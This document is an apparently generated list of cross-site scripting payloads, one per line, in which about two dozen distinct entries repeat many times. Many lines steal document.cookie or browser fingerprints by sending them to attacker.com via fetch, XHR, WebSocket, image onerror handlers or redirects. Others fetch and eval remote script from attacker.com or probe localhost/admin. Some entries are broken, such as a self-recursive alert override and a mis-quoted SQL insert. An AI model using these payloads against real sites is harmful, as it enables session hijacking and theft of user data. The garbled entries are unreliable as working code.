<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
